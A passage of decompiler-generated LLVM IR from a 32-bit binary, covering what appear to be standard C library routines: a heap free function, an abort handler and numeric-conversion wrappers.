  %v0_805431b = load i32, i32* @esi, align 4
  %v0_805431c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8054324 = icmp eq i32 %arg1, 0
  br i1 %v1_8054324, label %dec_label_pc_80544ad, label %dec_label_pc_805432c

dec_label_pc_805432c:                             ; preds = %dec_label_pc_8054319
  %v2_8054337 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054337, i32* @eax, align 4
  %v2_805433c = call i32 @function_8054a80(i32 %v2_8054337, i32 134564477)
  store i32 %v2_805433c, i32* %eax.global-to-local, align 4
  %v1_8054348 = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_80571e0.205 to i32))
  %v1_805434d = add i32 %arg1, -8
  store i32 %v1_805434d, i32* @ecx, align 4
  %v0_8054350 = load i8, i8* @global_var_8057580.206, align 1
  %v1_8054350 = sext i8 %v0_8054350 to i32
  store i32 %v1_8054350, i32* %eax.global-to-local, align 4
  %v1_8054358 = add i32 %arg1, -4
  %v2_8054358 = inttoptr i32 %v1_8054358 to i32*
  %v3_8054358 = load i32, i32* %v2_8054358, align 4
  %v1_805435d = and i32 %v3_8054358, -4
  %v4_805435d = trunc i32 %v1_805435d to i8
  store i32 %v1_805435d, i32* @ebx, align 4
  %v8_8054362 = icmp ugt i8 %v4_805435d, %v0_8054350
  br i1 %v8_8054362, label %dec_label_pc_8054384, label %dec_label_pc_8054364

dec_label_pc_8054364:                             ; preds = %dec_label_pc_805432c
  %v2_8054364 = udiv i32 %v3_8054358, 8
  %v1_8054367 = or i32 %v1_8054350, 3
  %v3_8054367 = trunc i32 %v1_8054367 to i8
  store i32 %v1_8054367, i32* %eax.global-to-local, align 4
  store i8 %v3_8054367, i8* @global_var_8057580.206, align 128
  %v1_805436f = mul nuw i32 %v2_8054364, 4
  %v2_805436f = add i32 %v1_805436f, ptrtoint (i8* @global_var_8057580.206 to i32)
  store i32 %v2_805436f, i32* @edx, align 4
  %v1_8054376 = add i32 %v1_805436f, add (i32 ptrtoint (i8* @global_var_8057580.206 to i32), i32 -4)
  %v2_8054376 = inttoptr i32 %v1_8054376 to i32*
  %v3_8054376 = load i32, i32* %v2_8054376, align 4
  store i32 %v3_8054376, i32* %eax.global-to-local, align 4
  %v3_8054379 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8054376, i32* %v3_8054379, align 4
  %v0_805437c = load i32, i32* @ecx, align 4
  %v1_805437c = load i32, i32* @edx, align 4
  %v2_805437c = add i32 %v1_805437c, -4
  %v3_805437c = inttoptr i32 %v2_805437c to i32*
  store i32 %v0_805437c, i32* %v3_805437c, align 4
  br label %dec_label_pc_805449c

dec_label_pc_8054384:                             ; preds = %dec_label_pc_805432c
  %v1_8054384 = trunc i32 %v3_8054358 to i8
  %v2_8054384 = and i8 %v1_8054384, 2
  %v3_8054384 = icmp eq i8 %v2_8054384, 0
  %v5_8054384 = zext i8 %v2_8054384 to i32
  %v7_8054384 = and i32 %v3_8054358, -256
  %v8_8054384 = or i32 %v5_8054384, %v7_8054384
  store i32 %v8_8054384, i32* @edx, align 4
  %v1_8054387 = icmp eq i1 %v3_8054384, false
  br i1 %v1_8054387, label %dec_label_pc_805447c, label %dec_label_pc_805438d

dec_label_pc_805438d:                             ; preds = %dec_label_pc_8054384
  %v1_805438d = or i32 %v1_8054350, 1
  %v3_805438d = trunc i32 %v1_805438d to i8
  store i32 %v1_805438d, i32* %eax.global-to-local, align 4
  %v2_8054390 = add i32 %v1_805435d, %v1_805434d
  store i32 %v2_8054390, i32* @esi, align 4
  store i8 %v3_805438d, i8* @global_var_8057580.206, align 128
  %v1_8054398 = add i32 %v2_8054390, 4
  %v2_8054398 = inttoptr i32 %v1_8054398 to i32*
  %v3_8054398 = load i32, i32* %v2_8054398, align 4
  store i32 %v3_8054398, i32* %eax.global-to-local, align 4
  %v2_805439f = inttoptr i32 %v1_8054358 to i8*
  %v3_805439f = load i8, i8* %v2_805439f, align 1
  %v4_805439f = urem i8 %v3_805439f, 2
  %v5_805439f = icmp eq i8 %v4_805439f, 0
  %v1_80543a3 = icmp eq i1 %v5_805439f, false
  br i1 %v1_80543a3, label %dec_label_pc_80543c6, label %dec_label_pc_80543a5

dec_label_pc_80543a5:                             ; preds = %dec_label_pc_805438d
  %v2_80543a5 = inttoptr i32 %v1_805434d to i32*
  %v3_80543a5 = load i32, i32* %v2_80543a5, align 4
  store i32 %v3_80543a5, i32* @ebp, align 4
  %v2_80543aa = sub i32 %v1_805434d, %v3_80543a5
  store i32 %v2_80543aa, i32* %eax.global-to-local, align 4
  %v1_80543ac = add i32 %v2_80543aa, 8
  %v2_80543ac = inttoptr i32 %v1_80543ac to i32*
  %v3_80543ac = load i32, i32* %v2_80543ac, align 4
  store i32 %v3_80543ac, i32* @edi, align 4
  %v1_80543af = add i32 %v2_80543aa, 12
  %v2_80543af = inttoptr i32 %v1_80543af to i32*
  %v3_80543af = load i32, i32* %v2_80543af, align 4
  store i32 %v3_80543af, i32* @edx, align 4
  %v1_80543b2 = add i32 %v3_80543ac, 12
  %v2_80543b2 = inttoptr i32 %v1_80543b2 to i32*
  %v3_80543b2 = load i32, i32* %v2_80543b2, align 4
  store i32 %v3_80543b2, i32* @ecx, align 4
  %v12_80543b5 = icmp eq i32 %v3_80543b2, %v2_80543aa
  %v1_80543b7 = icmp eq i1 %v12_80543b5, false
  br i1 %v1_80543b7, label %dec_label_pc_80543f5, label %dec_label_pc_80543b9

dec_label_pc_80543b9:                             ; preds = %dec_label_pc_80543a5
  %v1_80543b9 = add i32 %v3_80543af, 8
  %v2_80543b9 = inttoptr i32 %v1_80543b9 to i32*
  %v3_80543b9 = load i32, i32* %v2_80543b9, align 4
  %v15_80543b9 = icmp eq i32 %v3_80543b9, %v3_80543b2
  %v1_80543bc = icmp eq i1 %v15_80543b9, false
  br i1 %v1_80543bc, label %dec_label_pc_80543f5, label %dec_label_pc_80543be

dec_label_pc_80543be:                             ; preds = %dec_label_pc_80543b9
  %v2_80543be = add i32 %v3_80543a5, %v1_805435d
  store i32 %v2_80543be, i32* @ebx, align 4
  store i32 %v3_80543af, i32* %v2_80543b2, align 4
  %v0_80543c3 = load i32, i32* @edi, align 4
  %v1_80543c3 = load i32, i32* @edx, align 4
  %v2_80543c3 = add i32 %v1_80543c3, 8
  %v3_80543c3 = inttoptr i32 %v2_80543c3 to i32*
  store i32 %v0_80543c3, i32* %v3_80543c3, align 4
  %v0_80543cd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80543c6

dec_label_pc_80543c6:                             ; preds = %dec_label_pc_805438d, %dec_label_pc_80543be
  %v1_80543d9 = phi i32 [ %v2_8054390, %dec_label_pc_805438d ], [ %v0_80543cd.pre, %dec_label_pc_80543be ]
  %v1_80543ca = and i32 %v3_8054398, -4
  store i32 %v1_80543ca, i32* @ebp, align 4
  %v1_80543cd = load i32, i32* @global_var_80575ac.207, align 4
  %v12_80543cd = icmp eq i32 %v1_80543d9, %v1_80543cd
  br i1 %v12_80543cd, label %dec_label_pc_8054427, label %dec_label_pc_80543d5

dec_label_pc_80543d5:                             ; preds = %dec_label_pc_80543c6
  %v2_80543d5 = add i32 %v1_80543d9, 4
  %v3_80543d5 = add i32 %v2_80543d5, %v1_80543ca
  %v4_80543d5 = inttoptr i32 %v3_80543d5 to i32*
  %v5_80543d5 = load i32, i32* %v4_80543d5, align 4
  store i32 %v5_80543d5, i32* %eax.global-to-local, align 4
  %v3_80543d9 = inttoptr i32 %v2_80543d5 to i32*
  store i32 %v1_80543ca, i32* %v3_80543d9, align 4
  %v0_80543dc = load i32, i32* %eax.global-to-local, align 4
  %v1_80543dc = urem i32 %v0_80543dc, 2
  %v2_80543dc = icmp eq i32 %v1_80543dc, 0
  store i32 %v1_80543dc, i32* %eax.global-to-local, align 4
  %v1_80543e1 = icmp eq i1 %v2_80543dc, false
  br i1 %v1_80543e1, label %dec_label_pc_8054402, label %dec_label_pc_80543e3

dec_label_pc_80543e3:                             ; preds = %dec_label_pc_80543d5
  %v0_80543e3 = load i32, i32* @esi, align 4
  %v1_80543e3 = add i32 %v0_80543e3, 8
  %v2_80543e3 = inttoptr i32 %v1_80543e3 to i32*
  %v3_80543e3 = load i32, i32* %v2_80543e3, align 4
  store i32 %v3_80543e3, i32* @edx, align 4
  %v1_80543e6 = add i32 %v0_80543e3, 12
  %v2_80543e6 = inttoptr i32 %v1_80543e6 to i32*
  %v3_80543e6 = load i32, i32* %v2_80543e6, align 4
  store i32 %v3_80543e6, i32* %eax.global-to-local, align 4
  %v1_80543e9 = add i32 %v3_80543e3, 12
  %v2_80543e9 = inttoptr i32 %v1_80543e9 to i32*
  %v3_80543e9 = load i32, i32* %v2_80543e9, align 4
  store i32 %v3_80543e9, i32* @edi, align 4
  %v12_80543ec = icmp eq i32 %v3_80543e9, %v0_80543e3
  %v1_80543ee = icmp eq i1 %v12_80543ec, false
  br i1 %v1_80543ee, label %dec_label_pc_80543f5, label %dec_label_pc_80543f0

dec_label_pc_80543f0:                             ; preds = %dec_label_pc_80543e3
  %v1_80543f0 = add i32 %v3_80543e6, 8
  %v2_80543f0 = inttoptr i32 %v1_80543f0 to i32*
  %v3_80543f0 = load i32, i32* %v2_80543f0, align 4
  %v15_80543f0 = icmp eq i32 %v3_80543f0, %v3_80543e9
  br i1 %v15_80543f0, label %dec_label_pc_80543fa, label %dec_label_pc_80543f5

dec_label_pc_80543f5:                             ; preds = %dec_label_pc_80543f0, %dec_label_pc_80543e3, %dec_label_pc_80543b9, %dec_label_pc_80543a5
  %v0_80543f5 = call i32 @function_80544b5()
  store i32 %v0_80543f5, i32* %eax.global-to-local, align 4
  %v1_80543fa.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80543fa

dec_label_pc_80543fa:                             ; preds = %dec_label_pc_80543f0, %dec_label_pc_80543f5
  %v1_80543fa = phi i32 [ %v3_80543e3, %dec_label_pc_80543f0 ], [ %v1_80543fa.pre, %dec_label_pc_80543f5 ]
  %v0_80543fa = phi i32 [ %v3_80543e6, %dec_label_pc_80543f0 ], [ %v0_80543f5, %dec_label_pc_80543f5 ]
  %v2_80543fa = add i32 %v1_80543fa, 12
  %v3_80543fa = inttoptr i32 %v2_80543fa to i32*
  store i32 %v0_80543fa, i32* %v3_80543fa, align 4
  %v0_80543fd = load i32, i32* @edx, align 4
  %v1_80543fd = load i32, i32* %eax.global-to-local, align 4
  %v2_80543fd = add i32 %v1_80543fd, 8
  %v3_80543fd = inttoptr i32 %v2_80543fd to i32*
  store i32 %v0_80543fd, i32* %v3_80543fd, align 4
  %v0_8054400 = load i32, i32* @ebx, align 4
  %v1_8054400 = load i32, i32* @ebp, align 4
  %v2_8054400 = add i32 %v1_8054400, %v0_8054400
  store i32 %v2_8054400, i32* @ebx, align 4
  br label %dec_label_pc_8054402

dec_label_pc_8054402:                             ; preds = %dec_label_pc_80543d5, %dec_label_pc_80543fa
  %v0_8054402 = load i32, i32* @global_var_80575bc.225, align 4
  store i32 %v0_8054402, i32* %eax.global-to-local, align 4
  %v0_8054407 = load i32, i32* @ecx, align 4
  %v1_8054407 = add i32 %v0_8054407, 12
  %v2_8054407 = inttoptr i32 %v1_8054407 to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v2_8054407, align 4
  %v0_805440e = load i32, i32* %eax.global-to-local, align 4
  %v1_805440e = load i32, i32* @ecx, align 4
  %v2_805440e = add i32 %v1_805440e, 8
  %v3_805440e = inttoptr i32 %v2_805440e to i32*
  store i32 %v0_805440e, i32* %v3_805440e, align 4
  %v0_8054411 = load i32, i32* @ebx, align 4
  %v1_8054411 = load i32, i32* @ecx, align 4
  %v3_8054411 = add i32 %v1_8054411, %v0_8054411
  %v4_8054411 = inttoptr i32 %v3_8054411 to i32*
  store i32 %v0_8054411, i32* %v4_8054411, align 4
  %v0_8054414 = load i32, i32* @ecx, align 4
  %v1_8054414 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054414 = add i32 %v1_8054414, 12
  %v3_8054414 = inttoptr i32 %v2_8054414 to i32*
  store i32 %v0_8054414, i32* %v3_8054414, align 4
  %v0_8054417 = load i32, i32* @ebx, align 4
  %v1_8054419 = or i32 %v0_8054417, 1
  store i32 %v1_8054419, i32* %eax.global-to-local, align 4
  %v0_805441c = load i32, i32* @ecx, align 4
  store i32 %v0_805441c, i32* @global_var_80575bc.225, align 4
  %v2_8054422 = add i32 %v0_805441c, 4
  %v3_8054422 = inttoptr i32 %v2_8054422 to i32*
  store i32 %v1_8054419, i32* %v3_8054422, align 4
  br label %dec_label_pc_8054437

dec_label_pc_8054427:                             ; preds = %dec_label_pc_80543c6
  %v0_8054427 = load i32, i32* @ebx, align 4
  %v2_8054427 = add i32 %v0_8054427, %v1_80543ca
  store i32 %v2_8054427, i32* @ebx, align 4
  %v1_805442b = or i32 %v2_8054427, 1
  store i32 %v1_805442b, i32* %eax.global-to-local, align 4
  %v1_805442e = load i32, i32* @ecx, align 4
  %v2_805442e = add i32 %v1_805442e, 4
  %v3_805442e = inttoptr i32 %v2_805442e to i32*
  store i32 %v1_805442b, i32* %v3_805442e, align 4
  %v0_8054431 = load i32, i32* @ecx, align 4
  store i32 %v0_8054431, i32* @global_var_80575ac.207, align 4
  br label %dec_label_pc_8054437

dec_label_pc_8054437:                             ; preds = %dec_label_pc_8054402, %dec_label_pc_8054427
  %v0_8054437 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8054437, 131072
  br i1 %tmp21, label %dec_label_pc_805449c, label %dec_label_pc_805443f

dec_label_pc_805443f:                             ; preds = %dec_label_pc_8054437
  %v0_805443f = load i8, i8* @global_var_8057580.206, align 128
  %v1_805443f = and i8 %v0_805443f, 2
  %v2_805443f = icmp eq i8 %v1_805443f, 0
  br i1 %v2_805443f, label %dec_label_pc_8054458, label %dec_label_pc_8054448

dec_label_pc_8054448:                             ; preds = %dec_label_pc_805443f
  %v2_8054450 = call i32 @function_8054171(i32* bitcast (i8* @global_var_8057580.206 to i32*))
  store i32 %v2_8054450, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054458

dec_label_pc_8054458:                             ; preds = %dec_label_pc_805443f, %dec_label_pc_8054448
  %v0_8054458 = load i32, i32* @global_var_80575ac.207, align 4
  store i32 %v0_8054458, i32* %eax.global-to-local, align 4
  %v1_805445d = add i32 %v0_8054458, 4
  %v2_805445d = inttoptr i32 %v1_805445d to i32*
  %v3_805445d = load i32, i32* %v2_805445d, align 4
  %v1_8054460 = and i32 %v3_805445d, -4
  store i32 %v1_8054460, i32* %eax.global-to-local, align 4
  %v1_8054463 = load i32, i32* @global_var_80578c4.223, align 4
  %v7_8054463 = icmp ult i32 %v1_8054460, %v1_8054463
  br i1 %v7_8054463, label %dec_label_pc_805449c, label %dec_label_pc_805446b

dec_label_pc_805446b:                             ; preds = %dec_label_pc_8054458
  store i32 ptrtoint (i8* @global_var_8057580.206 to i32), i32* @edx, align 4
  %v0_8054470 = load i32, i32* @global_var_80578c8.221, align 8
  store i32 %v0_8054470, i32* @eax, align 4
  %v0_8054475 = call i32 @function_80540e4()
  store i32 %v0_8054475, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805449c

dec_label_pc_805447c:                             ; preds = %dec_label_pc_8054384
  %v2_805447c = inttoptr i32 %v1_805434d to i32*
  %v3_805447c = load i32, i32* %v2_805447c, align 4
  %v0_805447f = load i32, i32* @global_var_80578d0.214, align 16
  %v1_805447f = add i32 %v0_805447f, -1
  store i32 %v1_805447f, i32* @global_var_80578d0.214, align 16
  %v2_8054485 = add i32 %v3_805447c, %v1_805435d
  store i32 %v2_8054485, i32* %eax.global-to-local, align 4
  %v2_8054488 = sub i32 %v1_805434d, %v3_805447c
  %v0_805448e = load i32, i32* @global_var_80578e4.217, align 4
  %v2_805448e = sub i32 %v0_805448e, %v2_8054485
  store i32 %v2_805448e, i32* @global_var_80578e4.217, align 4
  %v4_8054494 = inttoptr i32 %v2_8054488 to i32*
  %v5_8054494 = call i32 @function_80551e5(i32* %v4_8054494, i32 %v2_8054485, i32 %v1_805435d, i32 %v1_805435d)
  store i32 %v5_8054494, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805449c

dec_label_pc_805449c:                             ; preds = %dec_label_pc_8054458, %dec_label_pc_8054437, %dec_label_pc_805446b, %dec_label_pc_8054364, %dec_label_pc_805447c
  store i32 %v2_8054337, i32* @eax, align 4
  %v2_80544a5 = call i32 @function_8054a80(i32 %v2_8054337, i32 1)
  store i32 %v2_80544a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80544ad

dec_label_pc_80544ad:                             ; preds = %dec_label_pc_8054319, %dec_label_pc_805449c
  %.0 = phi i32 [ undef, %dec_label_pc_8054319 ], [ %v2_80544a5, %dec_label_pc_805449c ]
  store i32 %v0_805431c, i32* @ebx, align 4
  store i32 %v0_805431b, i32* @esi, align 4
  store i32 %v0_805431a, i32* @edi, align 4
  store i32 %v0_8054319, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_805447c, { 1, 0 }
  uselistorder i32 %v0_8054411, { 1, 0 }
  uselistorder i32 %v1_80543dc, { 1, 0 }
  uselistorder i32 %v2_80543d5, { 1, 0 }
  uselistorder i32 %v1_80543ca, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80543d9, { 1, 0 }
  uselistorder i32 %v1_805435d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8054358, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805434d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8057580.206 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80575b4.209 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80575ac.207, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8057580.206 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8057580.206, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80571e0.205 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80544ad, { 1, 0 }
  uselistorder label %dec_label_pc_805449c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8054458, { 1, 0 }
  uselistorder label %dec_label_pc_8054437, { 1, 0 }
  uselistorder label %dec_label_pc_8054402, { 1, 0 }
  uselistorder label %dec_label_pc_80543fa, { 1, 0 }
  uselistorder label %dec_label_pc_80543c6, { 1, 0 }
}

define i32 @function_80544b5() local_unnamed_addr {
dec_label_pc_80544d0.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_80544c1 = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_80571f8.226 to i32))
  %v12_80544cb = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_80544d048 = add i32 %v12_80544cb, 276
  %v5_80544d049 = inttoptr i32 %v4_80544d048 to i32*
  store i32 0, i32* %v5_80544d049, align 4
  %v0_80544db50 = load i32, i32* %eax.global-to-local, align 4
  %v1_80544db51 = add i32 %v0_80544db50, -1
  %v9_80544db52 = icmp slt i32 %v1_80544db51, 0
  store i32 %v1_80544db51, i32* %eax.global-to-local, align 4
  %v1_80544dc53 = icmp eq i1 %v9_80544db52, false
  br i1 %v1_80544dc53, label %dec_label_pc_80544d0.dec_label_pc_80544d0_crit_edge, label %dec_label_pc_80544de

dec_label_pc_80544d0.dec_label_pc_80544d0_crit_edge: ; preds = %dec_label_pc_80544d0.lr.ph, %dec_label_pc_80544d0.dec_label_pc_80544d0_crit_edge
  %v1_80544db54 = phi i32 [ %v1_80544db, %dec_label_pc_80544d0.dec_label_pc_80544d0_crit_edge ], [ %v1_80544db51, %dec_label_pc_80544d0.lr.ph ]
  %v0_80544d0.pre = load i32, i32* @esp, align 4
  %v2_80544d0 = mul i32 %v1_80544db54, 4
  %v3_80544d0 = add i32 %v0_80544d0.pre, 152
  %v4_80544d0 = add i32 %v3_80544d0, %v2_80544d0
  %v5_80544d0 = inttoptr i32 %v4_80544d0 to i32*
  store i32 0, i32* %v5_80544d0, align 4
  %v0_80544db = load i32, i32* %eax.global-to-local, align 4
  %v1_80544db = add i32 %v0_80544db, -1
  %v9_80544db = icmp slt i32 %v1_80544db, 0
  store i32 %v1_80544db, i32* %eax.global-to-local, align 4
  %v1_80544dc = icmp eq i1 %v9_80544db, false
  br i1 %v1_80544dc, label %dec_label_pc_80544d0.dec_label_pc_80544d0_crit_edge, label %dec_label_pc_80544de

dec_label_pc_80544de:                             ; preds = %dec_label_pc_80544d0.dec_label_pc_80544d0_crit_edge, %dec_label_pc_80544d0.lr.ph
  %v0_80544de = load i32, i32* @ebx, align 4
  %v2_80544e2 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80544e2, i32* @ebx, align 4
  %v4_80544ea = call i32 @function_805350e(i32 %v2_80544e2, i32 6, i32 %v0_80544de, i32 %v0_80544de)
  store i32 %v4_80544ea, i32* %eax.global-to-local, align 4
  %v1_80544f2 = icmp eq i32 %v4_80544ea, 0
  %v1_80544f4 = icmp eq i1 %v1_80544f2, false
  br i1 %v1_80544f4, label %dec_label_pc_8054504, label %dec_label_pc_80544f6

dec_label_pc_80544f6:                             ; preds = %dec_label_pc_80544de
  %v3_80544fc = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80544fc = call i32 @function_8052e2d(i32 1, %_TYPEDEF_sigset_t* %v3_80544fc, i32 0)
  store i32 %v4_80544fc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054504

dec_label_pc_8054504:                             ; preds = %dec_label_pc_80544de, %dec_label_pc_80544f6
  %v2_805453c23 = phi i32 [ %v4_80544ea, %dec_label_pc_80544de ], [ %v4_80544fc, %dec_label_pc_80544f6 ]
  %v0_8054504 = load i8, i8* @global_var_80572f4.227, align 4
  %v1_8054504 = icmp eq i8 %v0_8054504, 0
  %v1_805450b = icmp eq i1 %v1_8054504, false
  br i1 %v1_805450b, label %dec_label_pc_805453c, label %dec_label_pc_805450d

dec_label_pc_805450d:                             ; preds = %dec_label_pc_8054504
  store i8 1, i8* @global_var_80572f4.227, align 4
  br label %dec_label_pc_8054514

dec_label_pc_8054514:                             ; preds = %dec_label_pc_805457b, %dec_label_pc_805450d
  %v1_805451c = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_80571f8.226 to i32))
  store i32 %v1_805451c, i32* %eax.global-to-local, align 4
  %v1_8054528 = call i32 @function_80533e0(i32 6)
  store i32 %v1_8054528, i32* %eax.global-to-local, align 4
  %v1_8054534 = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_80571f8.226 to i32))
  store i32 %v1_8054534, i32* %eax.global-to-local, align 4
  %v0_805453c.pre = load i8, i8* @global_var_80572f4.227, align 4
  br label %dec_label_pc_805453c

dec_label_pc_805453c:                             ; preds = %dec_label_pc_8054504, %dec_label_pc_8054514
  %v2_805453c = phi i32 [ %v2_805453c23, %dec_label_pc_8054504 ], [ %v1_8054534, %dec_label_pc_8054514 ]
  %v0_805453c = phi i8 [ %v0_8054504, %dec_label_pc_8054504 ], [ %v0_805453c.pre, %dec_label_pc_8054514 ]
  %v1_805453c = zext i8 %v0_805453c to i32
  %v3_805453c = and i32 %v2_805453c, -256
  %v4_805453c = or i32 %v1_805453c, %v3_805453c
  store i32 %v4_805453c, i32* %eax.global-to-local, align 4
  %v10_8054541 = icmp eq i8 %v0_805453c, 1
  %v1_8054543 = icmp eq i1 %v10_8054541, false
  br i1 %v1_8054543, label %dec_label_pc_805459d, label %dec_label_pc_8054570.lr.ph

dec_label_pc_8054570.lr.ph:                       ; preds = %dec_label_pc_805453c
  store i8 2, i8* @global_var_80572f4.227, align 4
  %v2_8054554 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8054554, i32* %eax.global-to-local, align 4
  %v3_8054559 = bitcast i32* %stack_var_-272 to i8*
  %v4_8054559 = call i32 @function_805314a(i8* %v3_8054559, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805457040 = add i32 %v12_80544cb, 140
  %v5_805457041 = inttoptr i32 %v4_805457040 to i32*
  store i32 -1, i32* %v5_805457041, align 4
  %v0_805457842 = load i32, i32* %eax.global-to-local, align 4
  %v1_805457843 = add i32 %v0_805457842, -1
  %v9_805457844 = icmp slt i32 %v1_805457843, 0
  store i32 %v1_805457843, i32* %eax.global-to-local, align 4
  %v1_805457945 = icmp eq i1 %v9_805457844, false
  br i1 %v1_805457945, label %dec_label_pc_8054570.dec_label_pc_8054570_crit_edge, label %dec_label_pc_805457b

dec_label_pc_8054570.dec_label_pc_8054570_crit_edge: ; preds = %dec_label_pc_8054570.lr.ph, %dec_label_pc_8054570.dec_label_pc_8054570_crit_edge
  %v1_805457846 = phi i32 [ %v1_8054578, %dec_label_pc_8054570.dec_label_pc_8054570_crit_edge ], [ %v1_805457843, %dec_label_pc_8054570.lr.ph ]
  %v0_8054570.pre = load i32, i32* @esp, align 4
  %v2_8054570 = mul i32 %v1_805457846, 4
  %v3_8054570 = add i32 %v0_8054570.pre, 16
  %v4_8054570 = add i32 %v3_8054570, %v2_8054570
  %v5_8054570 = inttoptr i32 %v4_8054570 to i32*
  store i32 -1, i32* %v5_8054570, align 4
  %v0_8054578 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054578 = add i32 %v0_8054578, -1
  %v9_8054578 = icmp slt i32 %v1_8054578, 0
  store i32 %v1_8054578, i32* %eax.global-to-local, align 4
  %v1_8054579 = icmp eq i1 %v9_8054578, false
  br i1 %v1_8054579, label %dec_label_pc_8054570.dec_label_pc_8054570_crit_edge, label %dec_label_pc_805457b

dec_label_pc_805457b:                             ; preds = %dec_label_pc_8054570.dec_label_pc_8054570_crit_edge, %dec_label_pc_8054570.lr.ph
  store i32 %v2_8054554, i32* %eax.global-to-local, align 4
  %v4_8054590 = call i32 @function_8054cbf(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8054590, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054514

dec_label_pc_805459d:                             ; preds = %dec_label_pc_805453c
  %v10_805459d = icmp eq i8 %v0_805453c, 2
  %v1_805459f = icmp eq i1 %v10_805459d, false
  br i1 %v1_805459f, label %dec_label_pc_80545a9, label %dec_label_pc_80545a9.thread

dec_label_pc_80545a9.thread:                      ; preds = %dec_label_pc_805459d
  store i8 3, i8* @global_var_80572f4.227, align 4
  br label %dec_label_pc_80545b2

dec_label_pc_80545a9:                             ; preds = %dec_label_pc_805459d
  %v9_80545a9 = icmp eq i8 %v0_805453c, 3
  %v1_80545b0 = icmp eq i1 %v9_80545a9, false
  br i1 %v1_80545b0, label %dec_label_pc_80545c3, label %dec_label_pc_80545b2

dec_label_pc_80545b2:                             ; preds = %dec_label_pc_80545a9.thread, %dec_label_pc_80545a9
  store i8 4, i8* @global_var_80572f4.227, align 4
  %v1_80545be = call i32 @function_8054e20(i32 127)
  unreachable

dec_label_pc_80545c3:                             ; preds = %dec_label_pc_80545a9, %dec_label_pc_80545c3
  br label %dec_label_pc_80545c3

; uselistorder directives
  uselistorder i32 %v1_8054578, { 2, 1, 0 }
  uselistorder i32 %v1_80544db, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 15, 16, 13, 14, 5, 6, 7, 8, 9, 10, 11, 12, 17, 18, 0, 1 }
  uselistorder i8 3, { 0, 4, 1, 2, 3 }
  uselistorder i8 2, { 8, 11, 12, 1, 13, 2, 3, 4, 5, 6, 14, 15, 7, 0, 10, 16, 9 }
  uselistorder i8* @global_var_80572f4.227, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80545c3, { 1, 0 }
  uselistorder label %dec_label_pc_80545b2, { 1, 0 }
  uselistorder label %dec_label_pc_8054570.dec_label_pc_8054570_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805453c, { 1, 0 }
  uselistorder label %dec_label_pc_8054504, { 1, 0 }
  uselistorder label %dec_label_pc_80544d0.dec_label_pc_80544d0_crit_edge, { 1, 0 }
}

define i32 @function_80545c6() local_unnamed_addr {
dec_label_pc_80545c6:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_80545d1 = call i32 @function_80545da(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_80545d1
}

define i32 @function_80545da(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80545da:
  %v4_80545eb = inttoptr i32 %arg1 to i8*
  %v5_80545eb = call i32 @function_80545f4(i8* %v4_80545eb, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80545eb
}

define i32 @function_80545f4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80545f4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
